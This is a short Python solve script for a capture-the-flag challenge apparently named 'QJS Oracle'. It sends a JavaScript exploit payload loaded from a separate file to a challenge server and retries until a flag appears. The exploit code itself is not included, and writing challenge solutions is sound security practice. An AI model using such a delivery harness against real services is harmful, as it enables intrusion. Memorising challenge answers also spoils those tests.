#!/usr/bin/env python3
"""QJS Oracle driver: send tools/exploit.js to the JSON-lines oracle and print the flag.

Usage: python solve.py [host] [port]
Default: 172.16.210.2 8000 (reachable over the challenge WireGuard tunnel).
"""
import json
import pathlib
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "172.16.210.2"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
PAYLOAD = (pathlib.Path(__file__).resolve().parent / "tools" / "exploit.js").read_text(encoding="utf-8")


def one_shot() -> str:
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall((json.dumps({"code": PAYLOAD}) + "\n").encode())
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    return buf.decode("utf-8", "replace").strip()


for attempt in range(1, 6):
    line = one_shot()
    m = re.search(r"FLAG\{[0-9a-fA-F]+\}", line)
    if m:
        print(m.group(0))
        raise SystemExit(0)
    print(f"attempt {attempt} failed: {line[:300]}", file=sys.stderr)

raise SystemExit("no flag recovered")
